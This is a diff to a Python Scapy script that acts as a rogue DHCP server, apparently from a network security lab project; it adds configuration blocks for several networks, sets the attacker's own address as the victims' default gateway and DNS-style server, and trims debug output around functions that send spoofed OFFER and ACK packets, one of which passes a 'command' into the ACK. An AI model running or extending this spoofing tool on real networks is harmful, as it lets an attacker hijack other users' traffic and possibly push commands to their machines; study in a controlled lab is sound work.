@@ -57,16 +57,56 @@ def get_option(dhcp_options, key):
 # fake_renewal_time = 86400
 # fake_rebinding_time = 138240
 
+# def get_my_real_IP():
+#     import socket
+#     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+#     s.connect(("8.8.8.8", 80))
+#     real_IP = s.getsockname()[0]
+#     s.close()
+#     return real_IP
+
+############ SAMSUNG LAB ####################
+# my_real_ip = '192.168.0.104'
+# broadcast_ip = '255.255.255.255'
+# fake_my_ip = '192.168.0.31'
+# fake_your_ip = '192.168.0.69'
+# fake_server_ip = my_real_ip
+# fake_subnet_mask = '255.255.255.0'
+# fake_router_ip = my_real_ip  # default gateway
+# fake_lease_time = 192800
+# fake_renewal_time = 186400
+# fake_rebinding_time = 138240
+##############################################
+
+
+############# CSE - 404 ######################
+# my_real_ip = '172.20.50.3'
+# broadcast_ip = '172.20.55.255'
+# fake_my_ip = '172.20.48.139'
+# fake_your_ip = '172.20.48.199'
+# fake_server_ip = my_real_ip
+# fake_subnet_mask = '255.255.248.0'
+# fake_router_ip = my_real_ip  # default gateway
+# fake_lease_time = 192800
+# fake_renewal_time = 186400
+# fake_rebinding_time = 138240
+##########################################
+
+
+############### HOME WIFI ################
+my_real_ip = '192.168.0.104'
 broadcast_ip = '255.255.255.255'
 fake_my_ip = '192.168.0.31'
 fake_your_ip = '192.168.0.69'
-fake_server_ip = '192.168.0.104'
+fake_server_ip = my_real_ip
 fake_subnet_mask = '255.255.255.0'
-fake_router_ip = '192.168.0.104'  # default gateway
+fake_router_ip = my_real_ip  # default gateway
 fake_lease_time = 192800
 fake_renewal_time = 186400
 fake_rebinding_time = 138240
 
+
+#############################################
 
 def make_dhcp_offer_packet(raw_mac, xid):
     packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
@@ -113,8 +153,8 @@ def send_rogue_dhcp_offer_packet(packet):
     print('XXXXXXXXXXXXXX Rogue OFFER packet on BUILD XXXXXXXXXXXXXX')
 
     new_packet = make_dhcp_offer_packet(raw_mac, xid)
-    print('New Packet data is:')
-    print(new_packet.show())
+    # print('New Packet data is:')
+    # print(new_packet.show())
     print("\n[*] Sending Rogue OFFER...")
     sendp(new_packet, iface=args.iface)
 
@@ -133,8 +173,8 @@ def send_rogue_dhcp_ACK_packet(packet):
 
     new_packet = make_dhcp_ack_packet(raw_mac, xid, command)
 
-    print('New Packet data is:')
-    print(new_packet.show())
+    # print('New Packet data is:')
+    # print(new_packet.show())
     print("\n[*] Sending ACK...")
     sendp(new_packet, iface=args.iface)
     print('XXXXXXXXXXXXXX Rogue ACK packet SENT XXXXXXXXXXXXXX')
@@ -226,8 +266,8 @@ def handle_dhcp_packet(packet):
         # print(packet.summary())
         # print(ls(packet))
 
-    print('Packet data is:')
-    print(packet.show())
+    # print('Packet data is:')
+    # print(packet.show())
 
     return
 
